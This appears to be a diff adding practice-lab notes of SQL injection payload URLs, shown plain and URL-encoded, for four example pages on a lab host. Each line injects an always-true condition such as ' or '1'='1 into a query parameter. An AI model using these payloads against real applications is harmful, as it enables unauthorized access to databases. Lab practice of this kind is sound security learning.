@@ -1,0 +1,13 @@
+Penetester
+
+http://169.254.0.3/sqli/example1.php?name=root' or '1'='1
+http://169.254.0.3/sqli/example1.php?name=root%27%20or%20%271%27=%271
+
+http://169.254.0.3/sqli/example2.php?name=root'or'1'='1
+http://169.254.0.3/sqli/example2.php?name=root%27or%271%27=%271
+
+http://169.254.0.3/sqli/example3.php?name=root'or'1'='1
+http://169.254.0.3/sqli/example3.php?name=root%27or%271%27=%271
+
+http://169.254.0.3/sqli/example4.php?id=-2 or 1=1
+http://169.254.0.3/sqli/example4.php?id=-2%20or%201=1
